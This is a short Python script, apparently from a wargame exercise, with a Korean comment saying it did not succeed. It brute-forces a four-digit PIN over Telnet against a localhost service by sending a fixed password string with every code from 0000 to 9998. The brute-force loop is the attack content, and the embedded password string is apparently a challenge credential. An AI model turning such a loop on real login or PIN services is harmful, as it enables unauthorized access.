# 성공을 결국에는 못함....

import time
from telnetlib import Telnet

command = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

with Telnet('localhost', 30002) as tn:
    for i in range(0, 9999):
        new_command = (command + str(i).zfill(4) + '\r\n').encode('ASCII')
        start_time = time.time()
        tn.write(new_command)
        response = tn.read_until(b'\r\n')
        print(response.decode('ASCII'))
        print("---{}s seconds---".format(time.time()-start_time))
